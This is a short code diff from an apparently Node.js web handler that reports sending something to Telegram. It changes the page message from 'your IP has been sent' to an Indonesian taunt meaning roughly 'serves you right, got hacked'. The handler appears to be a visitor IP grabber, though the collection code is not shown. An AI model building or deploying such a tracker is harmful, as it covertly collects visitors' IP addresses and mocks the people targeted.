@@ -18,5 +18,5 @@ module.exports = async (req, res) => {
     console.log("Gagal kirim ke Telegram:", err.message);
   }
 
-  res.status(200).send('<h1>Halo! IP kamu sudah terkirim 😎</h1>');
+  res.status(200).send('<h1>mampus kena hek 🤣🗿</h1>');
 };
